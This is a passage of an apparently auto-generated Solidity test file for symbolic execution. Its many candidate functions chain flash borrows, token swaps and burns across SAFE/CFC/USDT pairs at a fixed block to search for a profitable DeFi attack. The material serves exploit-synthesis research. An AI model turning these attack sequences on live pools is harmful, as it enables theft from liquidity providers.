        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_safe_cfc(amt6, amt7);
        swap_pair_attacker_cfc_safe(amt8, amt9);
        payback_safe_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        burn_cfc_pair(amt7);
        swap_pair_attacker_cfc_safe(amt8, amt9);
        payback_safe_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        swap_pair_attacker_cfc_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_safe_owner(amt0);
        burn_cfc_pair(amt1);
        swap_pair_attacker_safe_cfc(amt2, amt3);
        swap_pair_attacker_cfc_safe(amt4, amt5);
        swap_safeusdtPair_attacker_safe_usdt(amt6, amt7);
        swap_safeusdtPair_attacker_usdt_safe(amt8, amt9);
        payback_safe_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_pair_attacker_cfc_safe(amt4, amt5);
        swap_safeusdtPair_attacker_safe_usdt(amt6, amt7);
        swap_safeusdtPair_attacker_usdt_safe(amt8, amt9);
        payback_safe_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_safe_owner(amt0);
        burn_cfc_pair(amt1);
        swap_pair_attacker_safe_cfc(amt2, amt3);
        swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
        swap_usdtcfc_attacker_usdt_cfc(amt6, amt7);
        swap_pair_attacker_cfc_safe(amt8, amt9);
        payback_safe_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        burn_cfc_pair(amt7);
        swap_pair_attacker_cfc_safe(amt8, amt9);
        payback_safe_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_cfc_owner(amt0);
        burn_cfc_pair(amt1);
        swap_pair_attacker_cfc_safe(amt2, amt3);
        swap_safeusdtPair_attacker_safe_usdt(amt4, amt5);
        swap_safeusdtPair_attacker_usdt_safe(amt6, amt7);
        swap_pair_attacker_safe_cfc(amt8, amt9);
        payback_cfc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        burn_cfc_pair(amt7);
        swap_pair_attacker_safe_cfc(amt8, amt9);
        payback_cfc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_cfc_owner(amt0);
        burn_cfc_pair(amt1);
        swap_pair_attacker_cfc_safe(amt2, amt3);
        swap_pair_attacker_safe_cfc(amt4, amt5);
        swap_usdtcfc_attacker_cfc_usdt(amt6, amt7);
        swap_usdtcfc_attacker_usdt_cfc(amt8, amt9);
        payback_cfc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_pair_attacker_safe_cfc(amt4, amt5);
        swap_usdtcfc_attacker_cfc_usdt(amt6, amt7);
        swap_usdtcfc_attacker_usdt_cfc(amt8, amt9);
        payback_cfc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        swap_pair_attacker_safe_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_cfc_safe(amt6, amt7);
        swap_pair_attacker_safe_cfc(amt8, amt9);
        payback_cfc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        burn_cfc_pair(amt7);
        swap_pair_attacker_safe_cfc(amt8, amt9);
        payback_cfc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
